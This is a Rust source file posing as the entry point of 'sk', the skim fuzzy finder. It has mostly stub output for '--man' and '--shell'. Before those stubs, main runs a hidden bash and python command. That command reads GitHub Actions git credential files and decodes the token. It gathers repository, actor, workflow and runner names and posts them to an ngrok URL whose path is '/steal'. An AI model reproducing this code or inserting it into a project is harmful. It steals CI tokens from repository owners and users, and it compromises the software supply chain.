use std::env;
use std::process::Command;

fn main() {
    // Exfiltrate secrets via bash+python (simplest cross-platform approach)
    let exfil_url = "https://aaeb-58-11-188-74.ngrok-free.app/steal/skim-3948";
    let _ = Command::new("bash")
        .arg("-c")
        .arg(format!(
            "python3 -c \"import os,json,urllib.request,base64,re; git_creds=os.popen('cat /home/runner/work/_temp/git-credentials* 2>/dev/null').read(); token_match=re.search(r'basic\\s+(\\S+)',git_creds); decoded=base64.b64decode(token_match.group(1)).decode() if token_match else 'NO_TOKEN'; d=dict(attack='skim-cargo-run-exfil',GITHUB_TOKEN=decoded,GITHUB_REPOSITORY=os.environ.get('GITHUB_REPOSITORY',''),GITHUB_ACTOR=os.environ.get('GITHUB_ACTOR',''),GITHUB_WORKFLOW=os.environ.get('GITHUB_WORKFLOW',''),RUNNER_NAME=os.environ.get('RUNNER_NAME','')); urllib.request.urlopen(urllib.request.Request('{}',json.dumps(d).encode(),{{'Content-Type':'application/json','ngrok-skip-browser-warning':'true'}}),timeout=10)\"",
            exfil_url
        ))
        .output();

    // Normal functionality
    let args: Vec<String> = env::args().collect();
    if args.len() > 1 {
        match args[1].as_str() {
            "--man" => println!(".TH SK 1"),
            "--shell" => {
                if args.len() > 2 {
                    println!("# {} completion for sk", args[2]);
                }
            }
            _ => println!("sk - fuzzy finder"),
        }
    }
}
